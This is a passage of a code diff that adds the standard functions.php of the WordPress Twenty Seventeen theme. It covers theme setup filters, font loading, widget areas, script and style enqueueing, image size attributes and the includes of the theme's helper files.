+		),
+	);
+
+	/**
+	 * Filters Twenty Seventeen array of starter content.
+	 *
+	 * @since Twenty Seventeen 1.1
+	 *
+	 * @param array $starter_content Array of starter content.
+	 */
+	$starter_content = apply_filters( 'twentyseventeen_starter_content', $starter_content );
+
+	add_theme_support( 'starter-content', $starter_content );
+}
+add_action( 'after_setup_theme', 'twentyseventeen_setup' );
+
+/**
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ */
+function twentyseventeen_content_width() {
+
+	$content_width = $GLOBALS['content_width'];
+
+	// Get layout.
+	$page_layout = get_theme_mod( 'page_layout' );
+
+	// Check if layout is one column.
+	if ( 'one-column' === $page_layout ) {
+		if ( twentyseventeen_is_frontpage() ) {
+			$content_width = 644;
+		} elseif ( is_page() ) {
+			$content_width = 740;
+		}
+	}
+
+	// Check if is single post and there is no sidebar.
+	if ( is_single() && ! is_active_sidebar( 'sidebar-1' ) ) {
+		$content_width = 740;
+	}
+
+	/**
+	 * Filter Twenty Seventeen content width of the theme.
+	 *
+	 * @since Twenty Seventeen 1.0
+	 *
+	 * @param int $content_width Content width in pixels.
+	 */
+	$GLOBALS['content_width'] = apply_filters( 'twentyseventeen_content_width', $content_width );
+}
+add_action( 'template_redirect', 'twentyseventeen_content_width', 0 );
+
+/**
+ * Register custom fonts.
+ */
+function twentyseventeen_fonts_url() {
+	$fonts_url = '';
+
+	/*
+	 * Translators: If there are characters in your language that are not
+	 * supported by Libre Franklin, translate this to 'off'. Do not translate
+	 * into your own language.
+	 */
+	$libre_franklin = _x( 'on', 'Libre Franklin font: on or off', 'twentyseventeen' );
+
+	if ( 'off' !== $libre_franklin ) {
+		$font_families = array();
+
+		$font_families[] = 'Libre Franklin:300,300i,400,400i,600,600i,800,800i';
+
+		$query_args = array(
+			'family' => urlencode( implode( '|', $font_families ) ),
+			'subset' => urlencode( 'latin,latin-ext' ),
+		);
+
+		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
+	}
+
+	return esc_url_raw( $fonts_url );
+}
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array  $urls           URLs to print for resource hints.
+ * @param string $relation_type  The relation type the URLs are printed.
+ * @return array $urls           URLs to print for resource hints.
+ */
+function twentyseventeen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentyseventeen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		$urls[] = array(
+			'href' => 'https://fonts.gstatic.com',
+			'crossorigin',
+		);
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentyseventeen_resource_hints', 10, 2 );
+
+/**
+ * Register widget area.
+ *
+ * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
+ */
+function twentyseventeen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Blog Sidebar', 'twentyseventeen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 1', 'twentyseventeen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 2', 'twentyseventeen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentyseventeen_widgets_init' );
+
+/**
+ * Replaces "[...]" (appended to automatically generated excerpts) with ... and
+ * a 'Continue reading' link.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $link Link to single post/page.
+ * @return string 'Continue reading' link prepended with an ellipsis.
+ */
+function twentyseventeen_excerpt_more( $link ) {
+	if ( is_admin() ) {
+		return $link;
+	}
+
+	$link = sprintf(
+		'<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
+		esc_url( get_permalink( get_the_ID() ) ),
+		/* translators: %s: Name of current post */
+		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ), get_the_title( get_the_ID() ) )
+	);
+	return ' &hellip; ' . $link;
+}
+add_filter( 'excerpt_more', 'twentyseventeen_excerpt_more' );
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Seventeen 1.0
+ */
+function twentyseventeen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentyseventeen_javascript_detection', 0 );
+
+/**
+ * Add a pingback url auto-discovery header for singularly identifiable articles.
+ */
+function twentyseventeen_pingback_header() {
+	if ( is_singular() && pings_open() ) {
+		printf( '<link rel="pingback" href="%s">' . "\n", esc_url( get_bloginfo( 'pingback_url' ) ) );
+	}
+}
+add_action( 'wp_head', 'twentyseventeen_pingback_header' );
+
+/**
+ * Display custom color CSS.
+ */
+function twentyseventeen_colors_css_wrap() {
+	if ( 'custom' !== get_theme_mod( 'colorscheme' ) && ! is_customize_preview() ) {
+		return;
+	}
+
+	require_once( get_parent_theme_file_path( '/inc/color-patterns.php' ) );
+	$hue = absint( get_theme_mod( 'colorscheme_hue', 250 ) );
+
+	$customize_preview_data_hue = '';
+	if ( is_customize_preview() ) {
+		$customize_preview_data_hue = 'data-hue="' . $hue . '"';
+	}
+	?>
+	<style type="text/css" id="custom-theme-colors" <?php echo $customize_preview_data_hue; ?>>
+		<?php echo twentyseventeen_custom_colors_css(); ?>
+	</style>
+	<?php
+}
+add_action( 'wp_head', 'twentyseventeen_colors_css_wrap' );
+
+/**
+ * Enqueues scripts and styles.
+ */
+function twentyseventeen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentyseventeen-style', get_stylesheet_uri() );
+
+	// Theme block stylesheet.
+	wp_enqueue_style( 'twentyseventeen-block-style', get_theme_file_uri( '/assets/css/blocks.css' ), array( 'twentyseventeen-style' ), '1.1' );
+
+	// Load the dark colorscheme.
+	if ( 'dark' === get_theme_mod( 'colorscheme', 'light' ) || is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-colors-dark', get_theme_file_uri( '/assets/css/colors-dark.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	}
+
+	// Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
+	if ( is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'twentyseventeen-style' ), '1.0' );
+		wp_style_add_data( 'twentyseventeen-ie9', 'conditional', 'IE 9' );
+	}
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentyseventeen-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	wp_style_add_data( 'twentyseventeen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '3.7.3' );
+	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentyseventeen-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );
+
+	$twentyseventeen_l10n = array(
+		'quote' => twentyseventeen_get_svg( array( 'icon' => 'quote-right' ) ),
+	);
+
+	if ( has_nav_menu( 'top' ) ) {
+		wp_enqueue_script( 'twentyseventeen-navigation', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '1.0', true );
+		$twentyseventeen_l10n['expand']   = __( 'Expand child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['collapse'] = __( 'Collapse child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['icon']     = twentyseventeen_get_svg(
+			array(
+				'icon'     => 'angle-down',
+				'fallback' => true,
+			)
+		);
+	}
+
+	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '1.0', true );
+
+	wp_enqueue_script( 'jquery-scrollto', get_theme_file_uri( '/assets/js/jquery.scrollTo.js' ), array( 'jquery' ), '2.1.2', true );
+
+	wp_localize_script( 'twentyseventeen-skip-link-focus-fix', 'twentyseventeenScreenReaderText', $twentyseventeen_l10n );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+}
+add_action( 'wp_enqueue_scripts', 'twentyseventeen_scripts' );
+
+/**
+ * Enqueues styles for the block-based editor.
+ *
+ * @since Twenty Seventeen 1.8
+ */
+function twentyseventeen_block_editor_styles() {
+	// Block styles.
+	wp_enqueue_style( 'twentyseventeen-block-editor-style', get_theme_file_uri( '/assets/css/editor-blocks.css' ), array(), '1.1' );
+	// Add custom fonts.
+	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
+}
+add_action( 'enqueue_block_editor_assets', 'twentyseventeen_block_editor_styles' );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentyseventeen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 740 <= $width ) {
+		$sizes = '(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px';
+	}
+
+	if ( is_active_sidebar( 'sidebar-1' ) || is_archive() || is_search() || is_home() || is_page() ) {
+		if ( ! ( is_page() && 'one-column' === get_theme_mod( 'page_options' ) ) && 767 <= $width ) {
+			$sizes = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentyseventeen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Filter the `sizes` value in the header image markup.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $html   The HTML image tag markup being filtered.
+ * @param object $header The custom header object returned by 'get_custom_header()'.
+ * @param array  $attr   Array of the attributes for the image tag.
+ * @return string The filtered header image HTML.
+ */
+function twentyseventeen_header_image_tag( $html, $header, $attr ) {
+	if ( isset( $attr['sizes'] ) ) {
+		$html = str_replace( $attr['sizes'], '100vw', $html );
+	}
+	return $html;
+}
+add_filter( 'get_header_image_tag', 'twentyseventeen_header_image_tag', 10, 3 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array $attr       Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size       Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentyseventeen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( is_archive() || is_search() || is_home() ) {
+		$attr['sizes'] = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+	} else {
+		$attr['sizes'] = '100vw';
+	}
+
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentyseventeen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Use front-page.php when Front page displays is set to a static page.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $template front-page.php.
+ *
+ * @return string The template to be used: blank if is_home() is true (defaults to index.php), else $template.
+ */
+function twentyseventeen_front_page_template( $template ) {
+	return is_home() ? '' : $template;
+}
+add_filter( 'frontpage_template', 'twentyseventeen_front_page_template' );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Seventeen 1.4
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentyseventeen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentyseventeen_widget_tag_cloud_args' );
+
+/**
+ * Get unique ID.
+ *
+ * This is a PHP implementation of Underscore's uniqueId method. A static variable
+ * contains an integer that is incremented with each call. This number is returned
+ * with the optional prefix. As such the returned value is not universally unique,
+ * but it is unique across the life of the PHP process.
+ *
+ * @since Twenty Seventeen 2.0
+ * @see wp_unique_id() Themes requiring WordPress 5.0.3 and greater should use this instead.
+ *
+ * @staticvar int $id_counter
+ *
+ * @param string $prefix Prefix for the returned ID.
+ * @return string Unique ID.
+ */
+function twentyseventeen_unique_id( $prefix = '' ) {
+	static $id_counter = 0;
+	if ( function_exists( 'wp_unique_id' ) ) {
+		return wp_unique_id( $prefix );
+	}
+	return $prefix . (string) ++$id_counter;
+}
+
+/**
+ * Implement the Custom Header feature.
+ */
+require get_parent_theme_file_path( '/inc/custom-header.php' );
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_parent_theme_file_path( '/inc/template-tags.php' );
+
+/**
+ * Additional features to allow styling of the templates.
+ */
+require get_parent_theme_file_path( '/inc/template-functions.php' );
+
+/**
+ * Customizer additions.
+ */
+require get_parent_theme_file_path( '/inc/customizer.php' );
+
+/**
+ * SVG icons functions and filters.
+ */
+require get_parent_theme_file_path( '/inc/icon-functions.php' );
